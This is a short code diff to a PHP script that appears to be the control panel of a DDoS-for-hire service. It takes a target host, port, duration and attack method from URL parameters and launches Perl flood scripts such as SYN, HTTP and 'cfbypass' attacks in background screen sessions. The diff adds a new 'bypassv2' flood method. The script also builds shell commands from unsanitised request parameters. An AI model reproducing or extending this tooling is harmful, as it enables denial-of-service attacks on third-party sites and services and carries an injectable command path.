@@ -34,7 +34,7 @@ $method = $_GET['method'];
 $debug = isset($_GET['debug']) ? 1 : 0;
 
 $directory = "REPLACEME";
-$array = array("syn", "bypass", "http", "cfbypass", "stop", "update", "stopall");
+$array = array("syn", "bypass", "bypassv2", "http", "cfbypass", "stop", "update", "stopall");
 $ray = array("b387c979321e6360bc9a3a28fe83eb76");
 
 
@@ -117,6 +117,9 @@ if ($method == "syn") {
 }
 if ($method == "bypass") {
     $command = "screen -dm perl $directory/bypass.pl $host $time";
+}
+if ($method == "bypassv2") {
+    $command = "screen -dm perl $directory/bypass2.pl $host $port 0 $time";
 }
 if ($method == "http" or $method == "cfbypass") {
     if (substr($host, 0, 4) !== "http") {
